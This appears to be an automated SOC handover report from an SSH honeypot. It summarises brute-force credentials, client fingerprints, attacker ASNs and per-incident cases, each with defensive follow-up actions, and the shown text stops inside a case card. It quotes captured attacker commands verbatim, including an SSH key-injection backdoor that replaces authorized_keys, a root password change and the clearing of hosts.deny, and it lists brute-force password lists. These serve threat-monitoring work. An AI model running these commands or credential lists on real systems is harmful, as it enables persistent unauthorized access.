# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-16 |
| **Generated At** | 2026-04-16T20:58:15Z |
| **Shift Time** | 20:58 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **234** |
| Confirmed Threats | **232** |
| False Positives Filtered | **2** (0.9%) |
| Unique Attacker IPs | **22** |
| Countries of Origin | **13** |
| High Severity Cases | **80** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **154** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **172** |
| Unique Credential Pairs | **73** |
| Unique Usernames | **32** |
| Unique Passwords | **71** |
| Successful Auth Pairs | **51** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 81 |
| `345gs5662d34` | 39 |
| `ubuntu` | 7 |
| `mssql` | 3 |
| `ftpuser` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 39 |
| `3245gs5662d34` | 37 |
| `password` | 4 |
| `mssql` | 3 |
| `Root2018@@` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 39 |
| `root` | `3245gs5662d34` | 37 |
| `mssql` | `mssql` | 3 |
| `root` | `Root2018@@` | 3 |
| `root` | `1q2w3e` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `3245gs5662d34` | `43.227.185.238` | 2026-04-16T19:21:59 |
| `root` | `a123456"1` | `101.47.135.95` | 2026-04-16T19:22:40 |
| `root` | `3245gs5662d34` | `101.47.135.95` | 2026-04-16T19:22:42 |
| `root` | `1q2w3e` | `45.249.247.165` | 2026-04-16T19:24:56 |
| `root` | `3245gs5662d34` | `45.249.247.165` | 2026-04-16T19:24:59 |
| `root` | `CCqq1234` | `103.143.231.2` | 2026-04-16T19:25:40 |
| `root` | `3245gs5662d34` | `103.143.231.2` | 2026-04-16T19:25:49 |
| `root` | `Root111@#` | `152.32.135.217` | 2026-04-16T19:29:03 |
| `root` | `3245gs5662d34` | `152.32.135.217` | 2026-04-16T19:29:07 |
| `root` | `qazwsx$` | `172.174.17.234` | 2026-04-16T19:29:20 |
| `root` | `3245gs5662d34` | `172.174.17.234` | 2026-04-16T19:29:52 |
| `root` | `Asd@1234` | `152.32.135.217` | 2026-04-16T19:30:51 |
| `root` | `123456+` | `45.249.247.165` | 2026-04-16T19:31:19 |
| `root` | `deploy123` | `201.71.192.108` | 2026-04-16T19:33:29 |
| `root` | `3245gs5662d34` | `201.71.192.108` | 2026-04-16T19:33:37 |
| `root` | `12345678a!` | `152.32.135.217` | 2026-04-16T19:34:14 |
| `root` | `qwert` | `45.249.247.165` | 2026-04-16T19:34:19 |
| `root` | `Root654321` | `45.249.247.165` | 2026-04-16T19:37:23 |
| `root` | `qazwsx11111111` | `152.32.135.217` | 2026-04-16T19:37:30 |
| `root` | `Asd@1234` | `201.71.192.108` | 2026-04-16T19:38:55 |
| `root` | `12345678a!` | `201.71.192.108` | 2026-04-16T19:40:43 |
| `root` | `p` | `152.32.135.217` | 2026-04-16T19:40:46 |
| `root` | `woaini521.` | `172.174.17.234` | 2026-04-16T19:41:46 |
| `root` | `Root2018@@` | `103.143.231.2` | 2026-04-16T19:42:15 |
| `root` | `Root2018@@` | `45.249.247.165` | 2026-04-16T19:42:17 |
| `root` | `qwer1234qwer` | `152.32.135.217` | 2026-04-16T19:42:25 |
| `root` | `Aa123b` | `120.48.44.93` | 2026-04-16T19:43:33 |
| `root` | `Root2018@@` | `120.48.44.93` | 2026-04-16T19:44:54 |
| `root` | `3245gs5662d34` | `120.48.44.93` | 2026-04-16T19:45:04 |
| `root` | `CCqq1234` | `45.249.247.165` | 2026-04-16T19:45:34 |
| `root` | `test@123` | `45.249.247.165` | 2026-04-16T19:47:04 |
| `root` | `Qweqwe111` | `45.249.247.165` | 2026-04-16T19:48:34 |
| `root` | `Root11111111.` | `152.32.135.217` | 2026-04-16T19:49:10 |
| `root` | `Qweqwe111` | `103.143.231.2` | 2026-04-16T19:49:19 |
| `root` | `yj123456.` | `172.174.17.234` | 2026-04-16T19:49:55 |
| `root` | `deploy123` | `152.32.135.217` | 2026-04-16T19:50:53 |
| `root` | `passwd` | `45.249.247.165` | 2026-04-16T19:51:46 |
| `root` | `123456qw` | `172.174.17.234` | 2026-04-16T19:54:07 |
| `root` | `abc@123456789` | `152.32.135.217` | 2026-04-16T19:54:08 |
| `root` | `admin` | `178.218.144.64` | 2026-04-16T19:56:27 |
| `root` | `Qazwsx0@@` | `45.249.247.165` | 2026-04-16T19:56:39 |
| `root` | `Admin$2026` | `152.32.135.217` | 2026-04-16T19:57:30 |
| `root` | `QWER@1234` | `152.32.135.217` | 2026-04-16T19:59:12 |
| `root` | `123456@Ab` | `45.249.247.165` | 2026-04-16T19:59:45 |
| `root` | `root@admin123` | `152.32.135.217` | 2026-04-16T20:00:54 |
| `root` | `Abc123456789@` | `172.174.17.234` | 2026-04-16T20:02:12 |
| `root` | `Aa123b` | `45.249.247.165` | 2026-04-16T20:02:54 |
| `root` | `linux@2026` | `172.174.17.234` | 2026-04-16T20:10:22 |
| `root` | `1q2w3e` | `103.143.231.2` | 2026-04-16T20:12:44 |
| `root` | `passwd` | `103.143.231.2` | 2026-04-16T20:15:02 |
| `root` | `123456+` | `103.143.231.2` | 2026-04-16T20:17:27 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **234** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 197 |
| OpenSSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 197 | 12 |
| `1cc79c7da9b5...` | libssh-based | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 197 | 12 | Modern SSH client |
| `1cc79c7da9b5...` | OpenSSH | 1 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 4 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 36 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:ZAlhoYZxGSNG"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `103.143.231.2`, `172.174.17.234`, `120.48.44.93`, `201.71.192.108`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `45.249.247.165`, `120.48.44.93`, `172.174.17.234`, `201.71.192.108`, `101.47.135.95`, `152.32.135.217`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **22** |
| Unique ASNs | **19** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS23724` | IDC, China Telecommunications Corporation | 1 | HIGH |
| `AS396982` | Google LLC | 1 | LOW |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS1267` | WIND TRE S.P.A. | 1 | HIGH |
| `AS24863` | Link Egypt (Link.NET) | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (80)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-403875fb3f7e

| Field | Detail |
|---|---|
| **Source IP** | `43.227.185[.]238` |
| **First Seen** | 2026-04-16 19:21 |
| **Last Seen** | 2026-04-16 19:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:21:59` | `cowrie.session.connect` |
| `2026-04-16 19:21:59` | `cowrie.client.version` |
| `2026-04-16 19:21:59` | `cowrie.client.kex` |
| `2026-04-16 19:21:59` | `cowrie.login.success` |
| `2026-04-16 19:21:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.227.185[.]238` to AbuseIPDB if not already reported
- [ ] Block `43.227.185[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bc58575324f

| Field | Detail |
|---|---|
| **Source IP** | `101.47.135[.]95` |
| **First Seen** | 2026-04-16 19:22 |
| **Last Seen** | 2026-04-16 19:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:22:39` | `cowrie.session.connect` |
| `2026-04-16 19:22:39` | `cowrie.client.version` |
| `2026-04-16 19:22:40` | `cowrie.client.kex` |
| `2026-04-16 19:22:40` | `cowrie.login.success` |
| `2026-04-16 19:22:40` | `cowrie.session.params` |
| `2026-04-16 19:22:40` | `cowrie.command.input` |
| `2026-04-16 19:22:40` | `cowrie.command.failed` |
| `2026-04-16 19:22:40` | `cowrie.log.closed` |
| `2026-04-16 19:22:40` | `cowrie.session.params` |
| `2026-04-16 19:22:40` | `cowrie.command.input` |
| `2026-04-16 19:22:40` | `cowrie.session.file_download` |
| `2026-04-16 19:22:40` | `cowrie.log.closed` |
| `2026-04-16 19:22:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.135[.]95` to AbuseIPDB if not already reported
- [ ] Block `101.47.135[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-864fd63b1ac4

| Field | Detail |
|---|---|
| **Source IP** | `101.47.135[.]95` |
| **First Seen** | 2026-04-16 19:22 |
| **Last Seen** | 2026-04-16 19:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:22:42` | `cowrie.session.connect` |
| `2026-04-16 19:22:42` | `cowrie.client.version` |
| `2026-04-16 19:22:42` | `cowrie.client.kex` |
| `2026-04-16 19:22:42` | `cowrie.login.success` |
| `2026-04-16 19:22:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.135[.]95` to AbuseIPDB if not already reported
- [ ] Block `101.47.135[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2848839d0c12

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 19:24 |
| **Last Seen** | 2026-04-16 19:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:24:56` | `cowrie.session.connect` |
| `2026-04-16 19:24:56` | `cowrie.client.version` |
| `2026-04-16 19:24:56` | `cowrie.client.kex` |
| `2026-04-16 19:24:56` | `cowrie.login.success` |
| `2026-04-16 19:24:56` | `cowrie.session.params` |
| `2026-04-16 19:24:56` | `cowrie.command.input` |
| `2026-04-16 19:24:56` | `cowrie.command.failed` |
| `2026-04-16 19:24:56` | `cowrie.log.closed` |
| `2026-04-16 19:24:57` | `cowrie.session.params` |
| `2026-04-16 19:24:57` | `cowrie.command.input` |
| `2026-04-16 19:24:57` | `cowrie.session.file_download` |
| `2026-04-16 19:24:57` | `cowrie.log.closed` |
| `2026-04-16 19:24:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8f77f7a8cfd

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 19:24 |
| **Last Seen** | 2026-04-16 19:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:24:59` | `cowrie.session.connect` |
| `2026-04-16 19:24:59` | `cowrie.client.version` |
| `2026-04-16 19:24:59` | `cowrie.client.kex` |
| `2026-04-16 19:24:59` | `cowrie.login.success` |
| `2026-04-16 19:24:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd4e0073e0f5

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]2` |
| **First Seen** | 2026-04-16 19:25 |
| **Last Seen** | 2026-04-16 19:25 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:25:38` | `cowrie.session.connect` |
| `2026-04-16 19:25:38` | `cowrie.client.version` |
| `2026-04-16 19:25:39` | `cowrie.client.kex` |
| `2026-04-16 19:25:40` | `cowrie.login.success` |
| `2026-04-16 19:25:40` | `cowrie.session.params` |
| `2026-04-16 19:25:40` | `cowrie.command.input` |
| `2026-04-16 19:25:40` | `cowrie.command.failed` |
| `2026-04-16 19:25:41` | `cowrie.log.closed` |
| `2026-04-16 19:25:41` | `cowrie.session.params` |
| `2026-04-16 19:25:41` | `cowrie.command.input` |
| `2026-04-16 19:25:41` | `cowrie.session.file_download` |
| `2026-04-16 19:25:41` | `cowrie.log.closed` |
| `2026-04-16 19:25:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42c1eddeed8e

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]2` |
| **First Seen** | 2026-04-16 19:25 |
| **Last Seen** | 2026-04-16 19:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:25:48` | `cowrie.session.connect` |
| `2026-04-16 19:25:48` | `cowrie.client.version` |
| `2026-04-16 19:25:48` | `cowrie.client.kex` |
| `2026-04-16 19:25:49` | `cowrie.login.success` |
| `2026-04-16 19:25:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cde14ae160e

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 19:29 |
| **Last Seen** | 2026-04-16 19:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:29:03` | `cowrie.session.connect` |
| `2026-04-16 19:29:03` | `cowrie.client.version` |
| `2026-04-16 19:29:03` | `cowrie.client.kex` |
| `2026-04-16 19:29:03` | `cowrie.login.success` |
| `2026-04-16 19:29:04` | `cowrie.session.params` |
| `2026-04-16 19:29:04` | `cowrie.command.input` |
| `2026-04-16 19:29:04` | `cowrie.command.failed` |
| `2026-04-16 19:29:04` | `cowrie.log.closed` |
| `2026-04-16 19:29:04` | `cowrie.session.params` |
| `2026-04-16 19:29:04` | `cowrie.command.input` |
| `2026-04-16 19:29:04` | `cowrie.session.file_download` |
| `2026-04-16 19:29:04` | `cowrie.log.closed` |
| `2026-04-16 19:29:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1bfa7c6af12

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 19:29 |
| **Last Seen** | 2026-04-16 19:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:29:06` | `cowrie.session.connect` |
| `2026-04-16 19:29:06` | `cowrie.client.version` |
| `2026-04-16 19:29:06` | `cowrie.client.kex` |
| `2026-04-16 19:29:07` | `cowrie.login.success` |
| `2026-04-16 19:29:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58f2909b893f

| Field | Detail |
|---|---|
| **Source IP** | `172.174.17[.]234` |
| **First Seen** | 2026-04-16 19:29 |
| **Last Seen** | 2026-04-16 19:29 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:29:13` | `cowrie.session.connect` |
| `2026-04-16 19:29:14` | `cowrie.client.version` |
| `2026-04-16 19:29:14` | `cowrie.client.kex` |
| `2026-04-16 19:29:20` | `cowrie.login.success` |
| `2026-04-16 19:29:22` | `cowrie.session.params` |
| `2026-04-16 19:29:22` | `cowrie.command.input` |
| `2026-04-16 19:29:22` | `cowrie.command.failed` |
| `2026-04-16 19:29:28` | `cowrie.log.closed` |
| `2026-04-16 19:29:32` | `cowrie.session.params` |
| `2026-04-16 19:29:32` | `cowrie.command.input` |
| `2026-04-16 19:29:35` | `cowrie.session.file_download` |
| `2026-04-16 19:29:35` | `cowrie.log.closed` |
| `2026-04-16 19:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.17[.]234` to AbuseIPDB if not already reported
- [ ] Block `172.174.17[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-702ff7f97623

| Field | Detail |
|---|---|
| **Source IP** | `172.174.17[.]234` |
| **First Seen** | 2026-04-16 19:29 |
| **Last Seen** | 2026-04-16 19:29 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:29:42` | `cowrie.session.connect` |
| `2026-04-16 19:29:43` | `cowrie.client.version` |
| `2026-04-16 19:29:43` | `cowrie.client.kex` |
| `2026-04-16 19:29:52` | `cowrie.login.success` |
| `2026-04-16 19:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.17[.]234` to AbuseIPDB if not already reported
- [ ] Block `172.174.17[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91dcb8ffd4d8

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 19:30 |
| **Last Seen** | 2026-04-16 19:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
